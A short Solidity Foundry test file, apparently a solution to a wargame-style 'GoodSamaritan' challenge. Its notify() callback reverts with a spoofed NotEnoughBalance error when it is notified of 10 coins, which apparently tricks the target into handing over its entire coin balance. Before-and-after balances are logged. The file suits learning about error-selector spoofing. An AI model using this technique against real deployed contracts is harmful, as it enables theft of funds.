// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "forge-std/Test.sol";
import "../src/GoodSamaritan.sol";
import "../src/Coin.sol";
import "../src/INotifyable.sol";

contract TestAttack is Test, INotifyable {

    GoodSamaritan   good;
    Coin            coin;

    function setUp() external {
        good = new GoodSamaritan();
        coin = good.coin();
    }

    function testShow() external {
        console.log("Before: ", coin.balances(address(this)));
        good.requestDonation();
        console.log("After:  ", coin.balances(address(this)));
    }

    error NotEnoughBalance();

    function notify(uint256 amount) external view {
        if (amount == 10) {
            console.log("Rejecting: ", amount);
            revert NotEnoughBalance();
        }

        console.log("Received: ", amount);
    }
}
